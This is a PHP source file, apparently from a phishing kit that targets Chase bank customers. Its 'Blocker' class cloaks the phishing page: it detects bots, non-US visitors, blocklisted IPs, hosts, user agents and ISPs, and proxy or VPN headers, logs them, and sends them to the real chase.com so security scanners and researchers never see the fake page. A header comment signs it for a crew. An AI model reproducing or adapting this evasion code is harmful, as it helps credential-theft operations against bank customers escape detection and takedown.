<?php
defined('SYSTEM_PATH') or die('Go out you fucking bots.');

/*
Nubicod Since 2015.
Ruthvens Family never die.
We live in silent and peacefully.
Long life fams.
*/

class Blocker{
  private $core;
  private $file = SYSTEM_PATH . '/NubicodStyle/logs/bots.log';

  public function __construct(){
    $this->core = new Core;
  }

  public function run()
  {
    if ($this->core->is_robot()) {
        $this->core->_logbot('robot', 'Robots blocked', $this->file);
        $this->core->_blocks();
        $this->core->_redirect('https://href.li/?https://www.chase.com/');
    }

    if ($this->core->_config('lock_us') == 1) {
        $this->block_country();
    }

    if ($this->core->_config('block_ip') == 1) {
        $this->block_ip();
    }

    if ($this->core->_config('block_host') == 1) {
        $this->block_host();
    }

    if ($this->core->_config('block_useragent') == 1) {
        $this->block_useragent();
    }

    if ($this->core->_config('block_isp') == 1) {
        $this->block_isp();
    }

    if ($this->core->_config('block_vpn') == 1) {
        $this->block_vpn();
    }
  }

  public function block_country()
  {
    if(strtolower($this->core->_get_ses('countryCode')) !== 'us') {
        $this->core->_logbot('country', 'Non-US blocked', $this->file);
        $this->core->_blocks();
        $this->core->_redirect('https://href.li/?https://www.chase.com/');
    }
  }

  public function block_ip()
  {
    if (in_array($this->core->_get_ses('ip'), $this->core->_bot('ipv1'))) {
      $this->core->_logbot('ipv1', 'IP v1 Blocked', $this->file);
      $this->core->_blocks();
      $this->core->_redirect('https://href.li/?https://www.chase.com/');
    } else {
      foreach ($this->core->_bot('ipv2') as $ip) {
        if (preg_match("/".$ip."/i", strtolower($this->core->_get_ses('ip')))) {
          $this->core->_logbot('ipv2', 'IP v2 Blocked', $this->file);
          $this->core->_blocks();
          $this->core->_redirect('https://href.li/?https://www.chase.com/');
        }
      }
    }
  }

  public function block_host()
  {
    foreach ($this->core->_bot('host') as $host) {
      if (substr_count(strtolower($this->core->_get_ses('host')), strtolower($host)) > 0) {
        $this->core->_logbot('host', 'Host Blocked', $this->file);
        $this->core->_blocks();
        $this->core->_redirect('https://href.li/?https://www.chase.com/');
      }
    }
  }

  public function block_useragent()
  {
    if($this->core->_get_ses('useragent') == "" or $this->core->_get_ses('useragent') == NULL) {
      $this->core->_logbot('useragent', 'Unknown UserAgent Blocked', $this->file);
      $this->core->_blocks();
      $this->core->_redirect('https://href.li/?https://www.chase.com/');
    }

    foreach($this->core->_bot('useragent') as $useragent) {
      if (substr_count(strtolower($this->core->_get_ses('useragent')), strtolower($useragent)) > 0) {
        $this->core->_logbot('useragent', 'UserAgent Blocked', $this->file);
        $this->core->_blocks();
        $this->core->_redirect('https://href.li/?https://www.chase.com/');
      }
    }
  }

  public function block_isp()
  {
    if($this->core->_get_ses('isp') != null) {
      foreach ($this->core->_bot('isp') as $isp) {
        if (substr_count(strtolower($this->core->_get_ses('isp')), strtolower($isp)) > 0) {
            $this->core->_logbot('isp', 'ISP Blocked', $this->file);
            $this->core->_blocks();
            $this->core->_redirect('https://href.li/?https://www.chase.com/');
        }
      }
    } else {
        $this->core->_logbot('isp', 'Undetected ISP', $this->file);
    }
  }

  public function block_vpn()
  {
    $bannedProxy = ['CLIENT_IP', 'FORWARDED', 'FORWARDED_FOR', 'FORWARDED_FOR_IP', 'VIA', 'X_FORWARDED', 'X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_VIA', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_FOR'];
    foreach ($bannedProxy as $proxy) {
      if (isset($_SERVER[$proxy])) {
          $this->core->_logbot('proxy', 'Proxy/VPN Blocked', $this->file);
          $this->core->_blocks();
          $this->core->_redirect('https://href.li/?https://www.chase.com/');
      }
    }
  }
}

?>
